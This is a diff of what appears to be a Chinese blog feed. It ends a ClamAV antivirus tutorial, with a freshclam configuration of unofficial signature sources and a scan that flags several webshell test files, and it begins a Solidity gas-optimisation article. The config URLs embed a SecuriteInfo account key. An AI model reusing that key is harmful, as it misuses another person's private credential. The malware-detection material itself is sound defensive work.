@@ -61,16 +61,77 @@
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#SecuriteInfo Signatures (Get them from your own account)</span><br><span class="line">DatabaseCustomURL https://www.securiteinfo.com/get/signatures/a29de20248f9e2542b1cd40055535f7b120a1d241c7eac90c1779e9c459114cb959012c335051cbf5532b0e9875b4eb3b26eefed68b729a148640ab82e7ac4a6/securiteinfo.hdb</span><br><span class="line">DatabaseCustomURL https://www.securiteinfo.com/get/signatures/a29de20248f9e2542b1cd40055535f7b120a1d241c7eac90c1779e9c459114cb959012c335051cbf5532b0e9875b4eb3b26eefed68b729a148640ab82e7ac4a6/securiteinfo.ign2</span><br><span class="line">DatabaseCustomURL https://www.securiteinfo.com/get/signatures/a29de20248f9e2542b1cd40055535f7b120a1d241c7eac90c1779e9c459114cb959012c335051cbf5532b0e9875b4eb3b26eefed68b729a148640ab82e7ac4a6/javascript.ndb</span><br><span class="line">DatabaseCustomURL https://www.securiteinfo.com/get/signatures/a29de20248f9e2542b1cd40055535f7b120a1d241c7eac90c1779e9c459114cb959012c335051cbf5532b0e9875b4eb3b26eefed68b729a148640ab82e7ac4a6/spam_marketing.ndb</span><br><span class="line">DatabaseCustomURL https://www.securiteinfo.com/get/signatures/a29de20248f9e2542b1cd40055535f7b120a1d241c7eac90c1779e9c459114cb959012c335051cbf5532b0e9875b4eb3b26eefed68b729a148640ab82e7ac4a6/securiteinfohtml.hdb</span><br><span class="line">DatabaseCustomURL https://www.securiteinfo.com/get/signatures/a29de20248f9e2542b1cd40055535f7b120a1d241c7eac90c1779e9c459114cb959012c335051cbf5532b0e9875b4eb3b26eefed68b729a148640ab82e7ac4a6/securiteinfoascii.hdb</span><br><span class="line">DatabaseCustomURL https://www.securiteinfo.com/get/signatures/a29de20248f9e2542b1cd40055535f7b120a1d241c7eac90c1779e9c459114cb959012c335051cbf5532b0e9875b4eb3b26eefed68b729a148640ab82e7ac4a6/securiteinfoandroid.hdb</span><br><span class="line">DatabaseCustomURL https://www.securiteinfo.com/get/signatures/a29de20248f9e2542b1cd40055535f7b120a1d241c7eac90c1779e9c459114cb959012c335051cbf5532b0e9875b4eb3b26eefed68b729a148640ab82e7ac4a6/securiteinfoold.hdb</span><br><span class="line">DatabaseCustomURL https://www.securiteinfo.com/get/signatures/a29de20248f9e2542b1cd40055535f7b120a1d241c7eac90c1779e9c459114cb959012c335051cbf5532b0e9875b4eb3b26eefed68b729a148640ab82e7ac4a6/securiteinfopdf.hdb</span><br><span class="line"># Below this line, the downloads will not work if you have Basic (free) account</span><br><span class="line">#DatabaseCustomURL https://www.securiteinfo.com/get/signatures/a29de20248f9e2542b1cd40055535f7b120a1d241c7eac90c1779e9c459114cb959012c335051cbf5532b0e9875b4eb3b26eefed68b729a148640ab82e7ac4a6/securiteinfo0hour.hdb</span><br><span class="line">#DatabaseCustomURL https://www.securiteinfo.com/get/signatures/a29de20248f9e2542b1cd40055535f7b120a1d241c7eac90c1779e9c459114cb959012c335051cbf5532b0e9875b4eb3b26eefed68b729a148640ab82e7ac4a6/securiteinfo.mdb</span><br><span class="line">#DatabaseCustomURL https://www.securiteinfo.com/get/signatures/a29de20248f9e2542b1cd40055535f7b120a1d241c7eac90c1779e9c459114cb959012c335051cbf5532b0e9875b4eb3b26eefed68b729a148640ab82e7ac4a6/securiteinfo.yara</span><br><span class="line">#DatabaseCustomURL https://www.securiteinfo.com/get/signatures/a29de20248f9e2542b1cd40055535f7b120a1d241c7eac90c1779e9c459114cb959012c335051cbf5532b0e9875b4eb3b26eefed68b729a148640ab82e7ac4a6/securiteinfo.pdb</span><br><span class="line">#DatabaseCustomURL https://www.securiteinfo.com/get/signatures/a29de20248f9e2542b1cd40055535f7b120a1d241c7eac90c1779e9c459114cb959012c335051cbf5532b0e9875b4eb3b26eefed68b729a148640ab82e7ac4a6/securiteinfo.wdb</span><br><span class="line"></span><br><span class="line">#InterServer Signatures</span><br><span class="line">DatabaseCustomURL http://sigs.interserver.net/interserver256.hdb</span><br><span class="line">DatabaseCustomURL http://sigs.interserver.net/interservertopline.db</span><br><span class="line">DatabaseCustomURL http://sigs.interserver.net/shell.ldb</span><br><span class="line">DatabaseCustomURL http://sigs.interserver.net/whitelist.fp</span><br><span class="line"></span><br><span class="line">#RFXN Signatures</span><br><span class="line">DatabaseCustomURL http://www.rfxn.com/downloads/rfxn.ndb</span><br><span class="line">DatabaseCustomURL http://www.rfxn.com/downloads/rfxn.hdb</span><br><span class="line">DatabaseCustomURL http://www.rfxn.com/downloads/rfxn.yara</span><br><span class="line"></span><br><span class="line">#SaneSecurity Signatures</span><br><span class="line">DatabaseCustomURL http://sigs.mailborder.com/sigwhitelist.ign2</span><br><span class="line">DatabaseCustomURL http://sigs.mailborder.com/sanesecurity.ftm</span><br><span class="line">DatabaseCustomURL http://sigs.mailborder.com/hackingteam.hsb</span><br><span class="line">DatabaseCustomURL http://sigs.mailborder.com/crdfam.clamav.hdb</span><br><span class="line">DatabaseCustomURL http://sigs.mailborder.com/bofhland_malware_attach.hdb</span><br><span class="line"></span><br><span class="line"># Sanesecurity + Foxhole</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/MiscreantPunch099-INFO-Low.ldb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/MiscreantPunch099-Low.ldb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/Sanesecurity_BlackEnergy.yara</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/Sanesecurity_sigtest.yara</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/Sanesecurity_spam.yara</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/badmacro.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/blurl.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/bofhland_cracked_URL.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/bofhland_malware_URL.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/bofhland_malware_attach.hdb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/bofhland_phishing_URL.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/crdfam.clamav.hdb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/doppelstern-phishtank.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/doppelstern.hdb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/doppelstern.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/foxhole_all.cdb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/foxhole_all.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/foxhole_filename.cdb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/foxhole_generic.cdb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/foxhole_js.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/foxhole_mail.cdb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/hackingteam.hsb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/junk.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/jurlbl.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/jurlbla.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/lott.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/malwarehash.hsb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/phish.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/rogue.hdb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/scam.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/scamnailer.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/shelter.ldb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/sigwhitelist.ign2</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/spam.ldb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/spamattach.hdb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/spamimg.hdb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/spear.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/spearl.ndb</span><br><span class="line"></span><br><span class="line"># winnow</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/winnow.attachments.hdb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/winnow.complex.patterns.ldb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/winnow_bad_cw.hdb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/winnow_extended_malware.hdb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/winnow_extended_malware_links.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/winnow_malware.hdb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/winnow_phish_complete.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/winnow_phish_complete_url.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/winnow_spam_complete.ndb</span><br><span class="line"></span><br><span class="line"># bofhland</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/bofhland_cracked_URL.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/bofhland_malware_URL.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/bofhland_phishing_URL.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/bofhland_malware_attach.hdb</span><br><span class="line"></span><br><span class="line"># Porcupine</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/porcupine.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/phishtank.ndb</span><br><span class="line">DatabaseCustomURL https://ftp.swin.edu.au/sanesecurity/porcupine.hsb</span><br><span class="line"></span><br><span class="line">#maldet</span><br><span class="line">DatabaseCustomURL https://www.rfxn.com/downloads/rfxn.ndb</span><br><span class="line">DatabaseCustomURL https://www.rfxn.com/downloads/rfxn.hdb</span><br><span class="line"></span><br><span class="line">#Malware.Expert Signatures</span><br><span class="line">DatabaseCustomURL http://cdn.malware.expert/malware.expert.ndb</span><br><span class="line">DatabaseCustomURL http://cdn.malware.expert/malware.expert.hdb</span><br><span class="line">DatabaseCustomURL http://cdn.malware.expert/malware.expert.ldb</span><br><span class="line">DatabaseCustomURL http://cdn.malware.expert/malware.expert.fp</span><br><span class="line"></span><br><span class="line">#URLHaus Signatures</span><br><span class="line">DatabaseCustomURL https://urlhaus.abuse.ch/downloads/urlhaus.ndb</span><br></pre></td></tr></table></figure></div>
 <p>由于国内更新较慢，可通过<code>freshclam.conf</code>配置代理进行下载。</p>
 </li>
-<li><p>使用github的工具定期更新非官方的病毒库，也包含了市面上多个安全公司&#x2F;组织（securiteinfo，interserver，malware patrol，Sanesecurity, URLhaus）的病毒库，参考文档<a class="link" href="https://github.com/rseichter/fangfrisch%EF%BC%8C%E7%B1%BB%E4%BC%BC%E5%B7%A5%E5%85%B7%E8%BF%98%E6%9C%89https://github.com/extremeshok/clamav-unofficial-sigs%EF%BC%8C%E4%B8%8D%E8%BF%87%E6%AD%A4%E5%B7%A5%E5%85%B7%E7%9B%AE%E5%89%8D%E5%81%9C%E6%AD%A2%E7%BB%B4%E6%8A%A4%E3%80%82">https://github.com/rseichter/fangfrisch，类似工具还有https://github.com/extremeshok/clamav-unofficial-sigs，不过此工具目前停止维护。 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<li><p>使用github的工具定期更新非官方的病毒库，也包含了市面上多个安全公司&#x2F;组织（securiteinfo，interserver，malware patrol，Sanesecurity, URLhaus）的病毒库，参考文档<code>https://github.com/rseichter/fangfrisch</code>，类似工具还有<code>https://github.com/extremeshok/clamav-unofficial-sigs</code>，不过此工具目前停止维护。</p>
 </li>
 <li><p>更新完所有病毒库后，重新进行扫描，检测能力有所提升</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">    </span><br></pre></td></tr></table></figure></div></li>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost tmp]# clamscan -r /tmp</span><br><span class="line">Loading:    14s, ETA:   0s [========================&gt;]   13.10M/13.10M sigs       </span><br><span class="line">Compiling:   3s, ETA:   0s [========================&gt;]       42/42 tasks </span><br><span class="line"></span><br><span class="line">/tmp/.viminfo: OK</span><br><span class="line">/tmp/1.asp: OK</span><br><span class="line">/tmp/cmd.jsp: OK</span><br><span class="line">/tmp/test: &#123;HEX&#125;EICAR.TEST.3.UNOFFICIAL FOUND</span><br><span class="line">/tmp/2.php: sigs.InterServer.net.HEX.Topline.eval.post.428.UNOFFICIAL FOUND</span><br><span class="line">/tmp/3.txt: OK</span><br><span class="line">/tmp/shell.php: OK</span><br><span class="line">/tmp/xiema.jpg: YARA.eval_post.UNOFFICIAL FOUND</span><br><span class="line">/tmp/phpinfo.php: OK</span><br><span class="line">/tmp/1.php4: sigs.InterServer.net.HEX.Topline.eval.post.428.UNOFFICIAL FOUND</span><br><span class="line">/tmp/dama1.jpg: &#123;HEX&#125;php.gzbase64.inject.457.UNOFFICIAL FOUND</span><br><span class="line"></span><br><span class="line">----------- SCAN SUMMARY -----------</span><br><span class="line">Known viruses: 13096366</span><br><span class="line">Engine version: 1.4.1</span><br><span class="line">Scanned directories: 6</span><br><span class="line">Scanned files: 11</span><br><span class="line">Infected files: 5</span><br><span class="line">Data scanned: 0.08 MB</span><br><span class="line">Data read: 0.08 MB (ratio 1.00:1)</span><br><span class="line">Time: 20.480 sec (0 m 20 s)</span><br><span class="line">Start Date: 2024:12:19 04:49:34</span><br><span class="line">End Date:   2024:12:19 04:49:54</span><br></pre></td></tr></table></figure></div>
+<p>从检测结果看，检出率有一定提升，如需进一步提升检测效率，需购买商业或自研病毒库。</p>
+</li>
 </ul>
-<h4 id="自研病毒库"><a href="#自研病毒库" class="headerlink" title="自研病毒库"></a>自研病毒库</h4><p>  主要通过yara语法实现自定义的病毒库检测规则，需要研究并识别现有规则之外的病毒特征，并通过yara实现，参考<a class="link" href="https://docs.clamav.net/manual/Signatures/YaraRules.html?highlight=yara#using-yara-rules-in-clamav%E3%80%82%E7%9C%8B%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3clamav%E4%B8%ADyara%E8%A7%84%E5%88%99%E7%9A%84%E4%BD%BF%E7%94%A8%E6%9C%89%E4%BA%9B%E9%99%90%E5%88%B6%EF%BC%8C%E8%80%8C%E4%B8%94%E4%B8%93%E4%B8%9A%E6%80%A7%E8%A6%81%E6%B1%82%E9%AB%98%EF%BC%8C%E7%94%B1%E4%BA%8E%E6%97%B6%E9%97%B4%E7%B2%BE%E5%8A%9B%E6%88%90%E6%9C%AC%E7%AD%89%E5%9B%A0%E7%B4%A0%E8%BF%99%E9%87%8C%E4%B8%8D%E5%B1%95%E5%BC%80%E3%80%82">https://docs.clamav.net/manual/Signatures/YaraRules.html?highlight=yara#using-yara-rules-in-clamav。看官方文档clamav中yara规则的使用有些限制，而且专业性要求高，由于时间精力成本等因素这里不展开。 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h4 id="自研病毒库"><a href="#自研病毒库" class="headerlink" title="自研病毒库"></a>自研病毒库</h4><p>  主要通过yara语法实现自定义的病毒库检测规则，需要研究并识别现有规则之外的病毒特征，并通过yara实现，参考<code>https://docs.clamav.net/manual/Signatures/YaraRules.html?highlight=yara#using-yara-rules-in-clamav</code>。看官方文档clamav中yara规则的使用有些限制，而且专业性要求高，由于时间精力成本等因素这里不展开。</p>
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.clamav.net</span><br><span class="line">https://docs.clamav.net</span><br><span class="line">https://github.com/Cisco-Talos/clamav</span><br><span class="line">https://wiki.archlinuxcn.org/wiki/ClamAV</span><br><span class="line">https://xuxiaowei-com-cn.frama.io/blog/clamav.html</span><br><span class="line">https://ozgurkazancci.com/freebsd-protect-your-web-server-against-php-shells-and-malwares/</span><br><span class="line">https://gist.github.com/alsyundawy/9df58b03506bad8ccd08e06d15a8fa93#file-freshclam-conf</span><br></pre></td></tr></table></figure></div>
 ]]></content>
       <tags>
         <tag>ClamAV</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Gas优化（一）</title>
+    <url>/2024/04/13/GAS%E4%BC%98%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89/</url>
+    <content><![CDATA[<p>以太坊网络上的每个操作，从简单的转账到复杂的合约交互，都需要消耗Gas。Gas机制不仅防止了网络资源的滥用，还通过设置交易的 Gas Limit 确保每个操作计算资源使用在合理范围内，从而保障网络的安全性和稳定性。</p>
+<h2 id="存储优化"><a href="#存储优化" class="headerlink" title="存储优化"></a>存储优化</h2><h3 id="减少存储变量的读取"><a href="#减少存储变量的读取" class="headerlink" title="减少存储变量的读取"></a>减少存储变量的读取</h3><p>读取存储变量至少需要100gas（在EVM中，每次第一次访问任何存储变量时都必须付费，这称为“冷”访问，需要花费2100个gas。第二次或连续一次被称为“热”访问，需要花费 100 Gas。），因为Solidity不会缓存存储读取。<br>如下例子中存储变量<code>_decimalsETH</code>被重复读取</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function getTokensFromUSD(</span><br><span class="line">    address _tokenAddress,</span><br><span class="line">    uint256 _usdValue</span><br><span class="line">)</span><br><span class="line">    external</span><br><span class="line">    view</span><br><span class="line">    returns (uint256)</span><br><span class="line">&#123;</span><br><span class="line">    uint8 tokenDecimals = _tokenDecimals[</span><br><span class="line">        _tokenAddress</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    return _decimalsETH &lt; tokenDecimals     //第一次</span><br><span class="line">        ? _usdValue</span><br><span class="line">            * 10 ** (tokenDecimals - _decimalsETH)   //第二次</span><br><span class="line">            * 10 ** decimals(_tokenAddress)</span><br><span class="line">            / latestResolver(_tokenAddress)</span><br><span class="line">        : _usdValue</span><br><span class="line">            * 10 ** decimals(_tokenAddress)</span><br><span class="line">            / latestResolver(_tokenAddress)</span><br><span class="line">            / 10 ** (_decimalsETH - tokenDecimals);   //第二次</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>采用临时变量来缓存存储变量节省gas。</p>
+<h3 id="使用存储指针"><a href="#使用存储指针" class="headerlink" title="使用存储指针"></a>使用存储指针</h3><p>将整个结构体从存储中复制到内存中，包含了不需要的变量。而使用存储指针，通过引用传递只进行一次存储加载而不需要再从内存复制回存储中。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function increaseReservedForCompound(</span><br><span class="line">    address _pendleMarket,</span><br><span class="line">    uint256[] calldata _amounts</span><br><span class="line">)</span><br><span class="line">    external</span><br><span class="line">    onlyChildContract(_pendleMarket)</span><br><span class="line">&#123;</span><br><span class="line">    CompoundStruct memory childInfo = pendleChildCompoundInfo[</span><br><span class="line">        _pendleMarket</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    uint256 i;</span><br><span class="line">    uint256 length = childInfo.rewardTokens.length;</span><br><span class="line"></span><br><span class="line">    while (i &lt; length) &#123;</span><br><span class="line">        childInfo.reservedForCompound[i] += _amounts[i];</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            ++i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pendleChildCompoundInfo[_pendleMarket] = childInfo;</span><br><span class="line"></span><br><span class="line">    emit IncreaseReservedForCompound(</span><br><span class="line">        _pendleMarket,</span><br><span class="line">        _amounts</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>将<code>memery</code>改为<code>storage </code>，并删除<code>pendleChildCompoundInfo[_pendleMarket] = childInfo;</code>.</p>
+<h3 id="减少0值写入"><a href="#减少0值写入" class="headerlink" title="减少0值写入"></a>减少0值写入</h3><p>在存储变量做计算赋值时，应避免0的计算。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function increaseIncentiveA(</span><br><span class="line">    uint256 _value</span><br><span class="line">)</span><br><span class="line">    external</span><br><span class="line">    onlyIncentiveMaster</span><br><span class="line">&#123;</span><br><span class="line">    incentiveUSD[incentiveOwnerA] += _value;</span><br><span class="line"></span><br><span class="line">    emit IncentiveIncreasedA(</span><br><span class="line">        _value,</span><br><span class="line">        block.timestamp</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p><code>_value</code>如果为0，<code>incentiveUSD[incentiveOwnerA]</code>并没有发生变化，可以不进行加法运算，减少存储变量的读写操作。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">error ZeroValue();</span><br><span class="line">if(_value == 0) &#123;</span><br><span class="line">    revert ZeroValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>先<code>_value</code>判断是否为0，再进行加法操作。</p>
+<h3 id="只读参数使用calldata比memory便宜"><a href="#只读参数使用calldata比memory便宜" class="headerlink" title="只读参数使用calldata比memory便宜"></a>只读参数使用calldata比memory便宜</h3><p>直接从calldata中加载函数输入或数据比从内存中加载更便宜，因为从calldata访问数据涉及的操作和gas成本较少。因此，建议仅在函数需要修改数据时使用memory（calldata无法修改）。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function setBaseURI(</span><br><span class="line">    string memory _newBaseURI   // 用calldata代替memory</span><br><span class="line">)</span><br><span class="line">    external</span><br><span class="line">    onlyMaster</span><br><span class="line">&#123;</span><br><span class="line">    baseURI = _newBaseURI;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="变量优化"><a href="#变量优化" class="headerlink" title="变量优化"></a>变量优化</h2><p>Solidity中使用连续的插槽（32字节slot）来存储变量。当存储变量远小于32字节时，可以将多个32字节的存储变量打包到同一个插槽中优化gas使用。如果我们试图打包的变量超过当前槽的32字节限制，它将被存储在一个新的插槽中。<br><strong>值类型：</strong><br>整型(int&#x2F;uint)   uint256 32字节      (另外，enum枚举类型会被编译器自动转换成uint8类型)<br>地址类型(address)  address 20字节<br>布尔类型(bool)    bool 1字节<br>字节类型(byte)  bytes1 bytes2 bytes3 … bytes32  1~32字节<br>定长数组(uint[3],byte[2]..),  字节大小根据实际长度计算</p>
+<p>映射和动态数组的大小是不可预知的，它们本身只占32个字节，它们所包含的元素被存储在不同的存储槽，该存储槽是用Keccak-256哈希计算而来。<br><strong>引用类型：</strong>（占用字节数需要具体计算）<br>动态数组(uint[], byte[], string, address[]…)<br>映射(mapping)<br>结构体(struct) </p>
+<h3 id="打包存储变量"><a href="#打包存储变量" class="headerlink" title="打包存储变量"></a>打包存储变量</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">address public pool;</span><br><span class="line">uint256 public totalDebt;</span><br><span class="line">bool public strategyActive;</span><br></pre></td></tr></table></figure></div>
+<p>由于以上布局会使用3个插槽，调整布局进行变量打包，会把strategyActive和pool打包到1个插槽里，从而节省gas。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">address public pool;</span><br><span class="line">bool public strategyActive;</span><br><span class="line">uint256 public totalDebt;</span><br></pre></td></tr></table></figure></div>
+<p>打包后，会使用2个插槽。</p>
+<h3 id="打包结构体成员变量"><a href="#打包结构体成员变量" class="headerlink" title="打包结构体成员变量"></a>打包结构体成员变量</h3><p>在Solidity中，结构体成员从初始化的槽位置开始按顺序存储在合约的存储中。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct PositionPreview &#123; //  can be tightly packed by moving borrowType and liquidatable at the end</span><br><span class="line">    address owner;</span><br><span class="line">    uint256 nftIndex;</span><br><span class="line">    bytes32 nftType;</span><br><span class="line">    uint256 nftValueUSD;</span><br><span class="line">    VaultSettings vaultSettings;</span><br><span class="line">    uint256 creditLimit;</span><br><span class="line">    uint256 debtPrincipal;</span><br><span class="line">    uint256 debtInterest; //  32 bytes</span><br><span class="line">    BorrowType borrowType; //  1 byte (this enum is equivalent to uint8 as it has less than 256 options)</span><br><span class="line">    bool liquidatable; //   1 byte</span><br><span class="line">    uint256 liquidatedAt; // 32 bytes</span><br><span class="line">    address liquidator; // 20 bytes</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>打包成员变量，可以节省gas。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct PositionPreview &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    uint256 nftIndex;</span><br><span class="line">    bytes32 nftType;</span><br><span class="line">    uint256 nftValueUSD;</span><br><span class="line">    VaultSettings vaultSettings;</span><br><span class="line">    uint256 creditLimit;</span><br><span class="line">    uint256 debtPrincipal;</span><br><span class="line">    uint256 debtInterest; //  32 bytes</span><br><span class="line">    uint256 liquidatedAt; //  32 bytes</span><br><span class="line">    BorrowType borrowType; // 1 byte (this enum is equivalent to uint8 as it has less than 256 options)</span><br><span class="line">    bool liquidatable; //  1 byte</span><br><span class="line">    address liquidator; //  20 bytes</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+<h2 id="函数优化"><a href="#函数优化" class="headerlink" title="函数优化"></a>函数优化</h2><h3 id="使用函数命名式-returns-返回值"><a href="#使用函数命名式-returns-返回值" class="headerlink" title="使用函数命名式(returns)返回值"></a>使用函数命名式(returns)返回值</h3><p>Solidity中两个关键字：<code>return</code>和<code>returns</code>，区别是：</p>
+<ul>
+<li><code>return</code>: 在函数主体中，用于返回指定的变量；</li>
+<li><code>returns</code>: 加在函数名后面，用于生命返回的变量类型及变量名。</li>
+</ul>
+<p>在returns中标明返回变量的名称，这样solidity会自动给这些变量初始化，并且自动返回这些函数的值，不需要加return。每个变量可以节省9gas。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract TestContract  &#123;</span><br><span class="line">    function NoNamedReturn(uint256[] calldata inputs) </span><br><span class="line">        external </span><br><span class="line">        pure </span><br><span class="line">        returns(uint256) </span><br><span class="line">    &#123;</span><br><span class="line">        uint256 sum;</span><br><span class="line"></span><br><span class="line">        for(uint256 i; i&lt;inputs.length; i++) &#123;</span><br><span class="line">            sum += inputs[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return sum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function UsingNamedReturn(uint256[] calldata inputs) </span><br><span class="line">        external </span><br><span class="line">        pure </span><br><span class="line">        returns(uint256 sum) </span><br><span class="line">    &#123;</span><br><span class="line">        for(uint256 i; i&lt;inputs.length; i++) &#123;</span><br><span class="line">            sum += inputs[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="合并仅调用一次的internal函数"><a href="#合并仅调用一次的internal函数" class="headerlink" title="合并仅调用一次的internal函数"></a>合并仅调用一次的internal函数</h3><p>当某个被调用函数仅调用一次时，可以重构并合并到调用函数当中，函数调用会增加额外的堆栈和JUMP指令等开销。<br><strong>注：这可能会影响代码原有结构，适用于代码量少的函数，慎用。</strong></p>
+<h2 id="修饰符优化"><a href="#修饰符优化" class="headerlink" title="修饰符优化"></a>修饰符优化</h2><h3 id="选择合适的变量可见性"><a href="#选择合适的变量可见性" class="headerlink" title="选择合适的变量可见性"></a>选择合适的变量可见性</h3><p>避免使用公共变量（public），公共变量隐式创建一个getter函数，这可能会增加合约的大小和Gas使用。</p>
+<p>父合约<code>contracts/WiseLendingDeclaration.sol</code>定义存储变量：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mapping(uint256 =&gt; address[]) public positionLendTokenData;</span><br></pre></td></tr></table></figure></div>
+<p>子合约<code>contracts/WiseLowLevelHelper.sol</code>使用：</p>
